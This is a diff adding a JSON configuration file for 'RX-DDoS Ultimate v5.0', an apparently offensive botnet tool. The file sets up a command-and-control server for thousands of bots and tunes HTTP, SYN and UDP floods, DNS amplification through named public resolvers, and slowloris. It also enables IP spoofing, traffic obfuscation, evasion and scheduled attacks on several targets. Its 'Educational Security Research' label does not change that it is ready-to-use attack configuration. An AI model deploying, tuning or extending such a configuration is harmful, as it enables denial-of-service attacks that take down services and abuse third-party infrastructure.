@@ -1,0 +1,279 @@
+{
+  "project_metadata": {
+    "name": "RX-DDoS Ultimate v5.0",
+    "version": "5.0.0",
+    "developer": "CRZ101",
+    "team": "RX-TEAM",
+    "organization": "ANONYMOUS",
+    "license": "Educational Security Research",
+    "release_date": "2024-01-15",
+    "compatibility": ["Windows 10+", "Linux Ubuntu 18.04+", "macOS 10.15+"],
+    "repository": "https://github.com/CRZ101/RX-DDoS-Ultimate",
+    "documentation": "https://github.com/CRZ101/RX-DDoS-Ultimate/wiki"
+  },
+
+  "c2_server_configuration": {
+    "network": {
+      "host": "0.0.0.0",
+      "ports": [501, 502, 503],
+      "backup_ports": [504, 505, 506],
+      "max_connections": 10000,
+      "connection_timeout": 30,
+      "keepalive_interval": 25
+    },
+    "bot_management": {
+      "max_bots": 5000,
+      "bot_timeout": 60,
+      "auto_cleanup": true,
+      "health_check_interval": 30,
+      "reconnect_attempts": 5
+    },
+    "encryption_security": {
+      "encryption_algorithm": "fernet",
+      "encryption_key": "rx_team_advanced_botnet_v5_secure_2024",
+      "key_rotation": true,
+      "rotation_interval": 3600,
+      "key_strength": "high",
+      "hmac_authentication": true,
+      "message_integrity": true
+    },
+    "authentication": {
+      "bot_authentication": true,
+      "command_authentication": true,
+      "ip_whitelist": false,
+      "certificate_pinning": false,
+      "two_factor_auth": false
+    }
+  },
+
+  "attack_configurations": {
+    "http_flood": {
+      "performance": {
+        "max_threads": 5000,
+        "default_threads": 500,
+        "connection_pool_size": 1000,
+        "requests_per_second": 10000,
+        "keepalive_connections": true
+      },
+      "timing": {
+        "default_duration": 300,
+        "max_duration": 86400,
+        "ramp_up_time": 30,
+        "cooldown_period": 10
+      },
+      "request_engineering": {
+        "methods": ["GET", "POST", "HEAD", "PUT", "DELETE"],
+        "user_agents": [
+          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+          "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
+          "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+          "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
+        ],
+        "paths": ["/", "/index.html", "/api/v1", "/wp-admin", "/admin", "/login", "/api", "/graphql"],
+        "headers": {
+          "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "accept_language": "en-US,en;q=0.5",
+          "accept_encoding": "gzip, deflate, br",
+          "cache_control": "no-cache",
+          "pragma": "no-cache"
+        },
+        "payloads": {
+          "small": "a=1",
+          "medium": "username=test&password=test123&action=login",
+          "large": "data="
+        }
+      },
+      "advanced": {
+        "ssl_support": true,
+        "http2_support": false,
+        "random_delays": true,
+        "ip_rotation": true,
+        "referer_spoofing": true
+      }
+    },
+
+    "syn_flood": {
+      "performance": {
+        "max_packets_per_second": 100000,
+        "default_threads": 200,
+        "packet_size": 64,
+        "window_size": 65535
+      },
+      "packet_engineering": {
+        "flags": ["S", "SA", "FA", "RA"],
+        "source_ports": "random",
+        "sequence_numbers": "random",
+        "window_scaling": true,
+        "ip_spoofing": true,
+        "ttl_variation": true
+      },
+      "timing": {
+        "default_duration": 300,
+        "packet_interval": 0.001,
+        "burst_mode": true,
+        "burst_size": 1000
+      },
+      "advanced": {
+        "fragmentation": false,
+        "protocol_anomalies": false,
+        "os_fingerprinting": true
+      }
+    },
+
+    "udp_flood": {
+      "performance": {
+        "max_packets_per_second": 50000,
+        "default_threads": 300,
+        "packet_sizes": [512, 1024, 1400, 1500]
+      },
+      "protocol_targeting": {
+        "dns": true,
+        "ntp": true,
+        "snmp": true,
+        "chargen": true,
+        "qotd": true,
+        "random_data": true
+      },
+      "payload_strategies": {
+        "random_data": true,
+        "protocol_specific": true,
+        "amplification_vectors": true
+      }
+    },
+
+    "dns_amplification": {
+      "resolvers": {
+        "primary": ["8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1"],
+        "secondary": ["9.9.9.9", "149.112.112.112", "64.6.64.6", "64.6.65.6"],
+        "tertiary": ["208.67.222.222", "208.67.220.220", "8.26.56.26", "8.20.247.20"]
+      },
+      "query_optimization": {
+        "query_types": ["ANY", "TXT", "DNSKEY", "AXFR", "SRV"],
+        "domains": ["isc.org", "google.com", "cloudflare.com", "akamai.com"],
+        "edns_support": true,
+        "dnssec_support": true
+      },
+      "amplification": {
+        "expected_amplification": 50,
+        "max_amplification": 100,
+        "query_optimization": true,
+        "resolver_rotation": true
+      }
+    },
+
+    "slowloris": {
+      "sockets": {
+        "max_sockets_per_bot": 200,
+        "socket_timeout": 100,
+        "keepalive_headers": true
+      },
+      "timing": {
+        "header_send_interval": 15,
+        "connection_hold_time": 300
+      }
+    }
+  },
+
+  "performance_optimization": {
+    "thread_management": {
+      "max_worker_threads": 10000,
+      "thread_pool_size": 5000,
+      "io_multiplexing": true,
+      "async_operations": true
+    },
+    "memory_management": {
+      "max_memory_usage": "4GB",
+      "buffer_pool_size": "1GB",
+      "connection_pool_size": 5000,
+      "object_reuse": true
+    },
+    "network_optimization": {
+      "socket_reuse": true,
+      "connection_reuse": true,
+      "packet_batching": true,
+      "traffic_shaping": true
+    }
+  },
+
+  "stealth_evasion": {
+    "traffic_manipulation": {
+      "traffic_morphing": true,
+      "protocol_obfuscation": true,
+      "random_delays": true,
+      "jitter_injection": true
+    },
+    "ip_management": {
+      "ip_spoofing": true,
+      "source_rotation": true,
+      "proxy_support": true,
+      "tor_integration": false
+    },
+    "behavioral_evasion": {
+      "user_agent_rotation": true,
+      "referer_spoofing": true,
+      "cookie_injection": true,
+      "header_randomization": true
+    }
+  },
+
+  "monitoring_analytics": {
+    "real_time_metrics": {
+      "requests_per_second": true,
+      "success_rate": true,
+      "error_rate": true,
+      "response_times": true,
+      "bandwidth_usage": true
+    },
+    "bot_analytics": {
+      "bot_health": true,
+      "geographic_distribution": true,
+      "capability_tracking": true,
+      "performance_metrics": true
+    },
+    "logging": {
+      "log_level": "INFO",
+      "log_rotation": "daily",
+      "log_compression": true,
+      "log_encryption": true,
+      "retention_period": 30
+    },
+    "reporting": {
+      "auto_report_generation": true,
+      "report_formats": ["json", "html", "pdf", "csv"],
+      "report_metrics": ["performance", "security", "impact", "compliance"]
+    }
+  },
+
+  "advanced_features": {
+    "api_integration": {
+      "rest_api": true,
+      "websocket_support": true,
+      "web_interface": false
+    },
+    "automation": {
+      "scheduled_attacks": true,
+      "attack_presets": true,
+      "auto_scaling": true
+    },
+    "research_features": {
+      "protocol_analysis": true,
+      "vulnerability_testing": true,
+      "performance_benchmarking": true
+    }
+  },
+
+  "safety_limits": {
+    "resource_limits": {
+      "max_cpu_usage": 80,
+      "max_memory_usage": 85,
+      "max_bandwidth": "1Gbps",
+      "max_connections": 10000
+    },
+    "operational_limits": {
+      "max_attack_duration": 86400,
+      "max_targets_per_attack": 5,
+      "cool_down_period": 60
+    }
+  }
+}
